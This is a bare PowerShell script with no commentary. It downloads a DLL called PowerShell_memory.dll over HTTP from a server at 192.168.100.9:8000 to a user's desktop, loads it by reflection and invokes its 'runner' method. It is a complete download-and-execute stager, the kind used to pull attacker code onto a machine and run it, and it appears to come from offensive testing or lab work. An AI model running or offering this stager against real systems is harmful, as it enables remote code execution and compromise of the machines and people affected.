(New-Object System.Net.WebClient).DownloadFile('http://192.168.100.9:8000/PowerShell_memory.dll', 'C:\Users\RICHAR\Desktop\PowerShell_memory.dll')
$assem = [System.Reflection.Assembly]::LoadFile("C:\Users\RICHAR\Desktop\PowerShell_memory.dll")

$class = $assem.GetType("PowerShell_memory.Class1")
$method = $class.GetMethod("runner")
$method.Invoke(0, $null)
